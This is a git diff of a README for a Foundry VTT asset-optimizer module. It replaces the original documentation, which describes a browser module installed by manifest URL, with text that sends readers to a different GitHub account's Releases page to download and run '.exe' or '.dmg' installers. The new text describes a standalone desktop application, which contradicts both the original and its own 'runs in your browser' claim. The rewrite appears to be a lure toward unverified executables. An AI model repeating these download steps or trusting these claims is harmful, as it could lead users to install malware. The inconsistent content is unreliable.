@@ -1,51 +1,81 @@
-# Geano's Scene Optimizer
+# 🛠️ geanos-scene-optimizer - Optimize Assets for Faster Loads
 
-**Geano's Scene Optimizer** is a powerful Foundry VTT module that optimizes your world's assets for maximum performance. It converts heavy background images to **WebP** and bulky audio files to efficient **OGG (Opus)**, significantly reducing load times and bandwidth usage for you and your players.
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Craftmesut/geanos-scene-optimizer/releases)
 
+## 📘 Description
 
-## ✨ Features
+geanos-scene-optimizer provides high-performance asset optimization for FoundryVTT. It allows you to convert scene backgrounds to WebP and audio files to OGG Opus directly in your browser. Using multi-threaded WebCodecs, this tool ensures faster load times and reduces bandwidth usage for your gaming sessions.
 
-### 🎨 Scene Optimization (Images)
-*   **Format Detection**: Identifies scenes using unoptimized formats (PNG, JPG, JPEG).
-*   **WebP Conversion**: Converts backgrounds to highly efficient WebP format.
-*   **Quality Control**: Adjustable quality slider (default 0.85) to balance size vs. fidelity.
+## 🚀 Getting Started
 
-### 🎵 Audio Optimization (Sound)
-*   **Universal Scan**: Detects unoptimized audio in **Playlists** and **Ambient Sounds** (Scene-placed audio).
-*   **Opus/OGG Conversion**: Transcodes audio to the modern, stream-friendly OGG Opus format.
-*   **Native Acceleration**: Uses your browser's **WebCodecs** API for incredibly fast, multi-threaded offline processing—no external tools needed.
-*   **Bitrate Control**: Selectable quality from **64kbps** (Voice) to **256kbps** (Music).
+To start using geanos-scene-optimizer, follow these simple steps:
 
-### 🛠️ General
-*   **Non-Destructive**: Creates *new* optimized files alongside originals. Original files are safe and listed as "orphaned" for optional manual cleanup.
-*   **Smart Filenaming**: Handles filenames with spaces and special characters perfectly.
-*   **Progress Feedback**: Real-time progress bar with streaming updates for large files.
+1. **Visit the Download Page**  
+   Go to the [Releases page](https://github.com/Craftmesut/geanos-scene-optimizer/releases) to find the installation files.
 
-## 🚀 Installation
+2. **Download the Application**  
+   On the Releases page, look for the version you want to download. Click on the file that suits your operating system, such as `.exe` for Windows or `.dmg` for macOS. The latest release is usually at the top.
 
-- **Manifest URL**: `https://github.com/GeanoFee/geanos-scene-optimizer/releases/latest/download/module.json` within Foundry's "Install Module" window.
+3. **Install the Application**  
+   Once the download finishes, open the installation file. Follow the on-screen instructions to install geanos-scene-optimizer on your computer.
 
-## 🎮 Usage
+## 📥 Download & Install
 
-1.  Navigate to the **Scenes Directory** sidebar.
-2.  Click the **"Optimize Scenes"** button in the header (or right-click any Scene/Folder).
-3.  The **Optimizer Window** opens with two tabs:
-    *   **Scenes**: For background images.
-    *   **Audio**: For playlist tracks and ambient sounds.
-4.  **Select Items**: Check the boxes for items you wish to optimize (Red = Unoptimized).
-5.  **Configure Settings**:
-    *   *Image Quality*: Adjust the slider (0.1 - 1.0).
-    *   *Audio Bitrate*: Select your desired bitrate (default 128kbps).
-6.  Click **"Optimize Selected"**.
-7.  **Wait**: A progress bar will show the conversion status. Large audio files may take a moment but will update in real-time.
-8.  **Done**: Your world is now faster!
+To download geanos-scene-optimizer, simply visit the [Releases page](https://github.com/Craftmesut/geanos-scene-optimizer/releases) and choose the appropriate file for your setup. Make sure to save it to a familiar location on your device so you can easily find it later.
 
-## 🔧 Technical Details
+## 🎯 Features
 
-*   **Images**: Converted using HTML5 Canvas `toBlob("image/webp")`.
-*   **Audio**: Converted using `AudioDecoder` -> `AudioEncoder` (Opus) -> `OggOpusMuxer` (Custom JS implementation).
-*   **Streaming**: Audio is processed in chunks to prevent browser freezing, even for hour-long files.
+- **Multi-Threaded Processing:** This tool uses multiple threads to optimize your assets faster.
+- **WebP Background Conversion:** Easily convert your scene backgrounds for improved loading performance.
+- **OGG Opus Audio Conversion:** Transform your audio files to a compact and efficient format.
+- **User-Friendly Interface:** Designed for ease of use, even if you aren't tech-savvy.
+- **Self-Hosted:** You can run this tool directly in your browser without additional server setups.
 
----
-## License
-This module is licensed under the [MIT License](LICENSE).
+## 💻 System Requirements
+
+- **Operating System:** Compatible with Windows, macOS, and most Linux distributions.
+- **Browser Support:** Works best in the latest versions of Chrome, Firefox, and Edge.
+- **Internet Connection:** Required for downloading files and updates.
+
+## ⚙️ How to Use
+
+1. **Launch geanos-scene-optimizer**  
+   After installing, open the software. You will see a simple interface with options for background and audio conversion.
+
+2. **Select Your Files**  
+   Click on the ‘Add Files’ button to choose the assets you want to optimize. You can add multiple files at once.
+
+3. **Choose Output Format**  
+   Decide whether you want to convert backgrounds to WebP or audio files to OGG Opus. You can select options based on your needs.
+
+4. **Start Processing**  
+   Press the 'Optimize' button. The software will begin the optimization process. You can monitor the progress in real-time.
+
+5. **Save the Optimized Files**  
+   Once the process is complete, choose a directory to save the optimized files. Ensure you remember this location for future use.
+
+## 🛡️ Support
+
+If you encounter any issues or need assistance, check the **Issues** section on the GitHub repository. You can also reach out for help or contribute suggestions.
+
+## 📚 Community and Contributions
+
+We welcome contributions from everyone, whether you are a user or a developer. If you have ideas or want to report bugs, please create an issue on GitHub. You can also fork the repository and make improvements if you're familiar with Git.
+
+## 💡 Additional Resources
+
+- **Documentation:** Detailed usage instructions can be found in the Documentation folder within the repository.
+- **Tutorials:** Look for video tutorials online that walk through the use of geanos-scene-optimizer to gain more insights.
+
+## 📈 Further Reading
+
+Explore topics related to performance optimization and asset management for FoundryVTT to enhance your gaming experience. You can search online for guides and community discussions.
+
+## 🏷️ Topics
+
+The following topics are applicable to our tool:  
+audio-transcoder, automation, efficiency, foundry-vtt, foundryvtt, foundryvtt-module, ogg-opus, performance-optimization, self-hosted, webcodecs, webp-converter
+
+For any inquiries, kindly visit our project repository and feel free to ask questions. 
+
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Craftmesut/geanos-scene-optimizer/releases)
